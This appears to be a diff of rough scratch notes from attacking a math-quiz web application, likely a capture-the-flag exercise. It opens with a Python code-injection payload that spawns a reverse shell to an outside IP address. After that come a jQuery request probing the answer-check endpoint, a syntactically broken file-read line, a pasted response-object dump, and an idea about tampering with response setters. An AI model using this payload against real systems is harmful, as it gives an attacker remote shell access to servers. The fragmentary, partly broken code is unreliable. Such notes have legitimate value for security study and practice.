@@ -1,0 +1,46 @@
+payload should be:
+__import__('os').system(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.14.67.85\",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'\")
+
+$.post("/ajax/new_problem", {'problem': "74 + 50", 'answer':74+50 }, function ( data ) {
+      if (data.correct) {
+	data.correct = false;
+	console.log(data.problem);        
+      }
+});
+
+require('fs').readFileSync('./new_problem'o)
+
+response is "
+
+abort: function abort()​
+always: function always()​
+catch: function catch()​
+done: function add()​
+fail: function add()​
+getAllResponseHeaders: function getAllResponseHeaders()​
+getResponseHeader: function getResponseHeader()​
+overrideMimeType: function overrideMimeType()​
+pipe: function pipe()​
+progress: function add()​
+promise: function promise()
+readyState: 4
+responseJSON: Object { correct: false, problem: "42 - 71" }
+responseText: "{\"correct\": true, \"problem\": \"42 - 71\"}"
+setRequestHeader: setRequestHeader()
+length: 2
+name: "setRequestHeader"
+prototype: Object { … }
+<prototype>: function ()
+state: function state()
+status: 200
+statusCode: function statusCode()
+statusText: "OK"
+then: function then()​
+<prototype>: Object { … }
+
+42 - 71
+
+
+what if we get info on the server like:
+
+self.responseJSON.__defineSetter__()
